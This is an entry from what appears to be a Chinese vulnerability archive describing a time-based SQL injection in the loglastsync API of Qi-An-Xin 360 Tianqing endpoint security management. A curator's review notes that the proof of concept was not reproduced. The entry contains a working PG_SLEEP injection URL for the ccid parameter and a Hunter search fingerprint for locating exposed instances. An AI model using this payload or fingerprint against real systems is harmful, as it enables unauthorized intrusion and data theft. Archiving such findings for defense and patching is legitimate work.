---
source: "wy876 漏洞文库"
id: "vw-f9d5675329c3865865f89478"
entity_id: "ve-f9d5675329c3865865f89478"
schema_version: "1"
fofa_unverified: "app.name=="
title: "360天擎终端安全管理系统loglastsync存在SQL注入漏洞"
product: "奇安信360天擎管理服务"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "PostgreSQL pg_sleep，权限/版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/360/360%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Floglastsync%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lcp8zauczcyost59"
source_status: "recorded"
---

# 360天擎终端安全管理系统loglastsync存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信360天擎管理服务
- 本文讨论：api/dp/loglastsync ccid SQL注入
- 版本、权限与配置前提：PostgreSQL pg_sleep，权限/版本未知
- 资料类型：延时SQL注入路径；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- sqlmap节只是URL，缺命令/结果；无延时基线与对照
- IoT分类不精确，FOFA元数据错装Hunter
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 接口认证、版本及延时证据待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎loglastsync存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征


# 四、漏洞复现
```plain
/api/dp/loglastsync?ccid=1') AND 9421=(SELECT 9421 FROM PG_SLEEP(5)) AND ('crvL'='crvL
```


sqlmap

```plain
/api/dp/loglastsync?ccid=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lcp8zauczcyost59>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
